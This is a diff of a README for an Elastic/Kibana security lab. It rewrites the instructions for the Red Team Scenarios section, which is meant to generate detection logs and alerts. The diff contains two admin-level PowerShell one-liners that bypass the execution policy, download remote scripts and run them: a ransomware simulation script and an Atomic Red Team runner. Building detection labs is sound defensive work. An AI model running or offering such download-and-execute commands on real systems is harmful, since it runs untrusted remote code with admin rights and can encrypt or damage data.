@@ -45,24 +45,27 @@ if it shows that the agent is offline / unhealhy you will need to restart the ag
 -------------------  
    
 ### Red Team Scenarios
-
+  
+Open Powershell as `Administrator` and execute the code below. 
+This will generate logs and alerts within Kibana. 
+Depening on the scenario the powershell scripts can take from 5 - 30 minutes to execute.  
+When you what to reset the VM or clean up after the attack just select the restart snapshot.
+  
 #### Ransomware ####
 
 ```
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/Ransom.ps1')"
 ```
   
+#### Execute all atomic red team scripts ####
+  
+```
+powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/AtomicRedTeam_All.ps1')"
+```  
 -------------------  
    
   
-### Execute all atomic red team scripts
-  
-Open Powershell as administrator executing code below. This will generate large amounts of alerts and logs within Kibana. Code will roughly take around 30 minutes to execute.  
 
-
-```
-powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/AtomicRedTeam_All.ps1')"
-```
 
 -------------------  
   
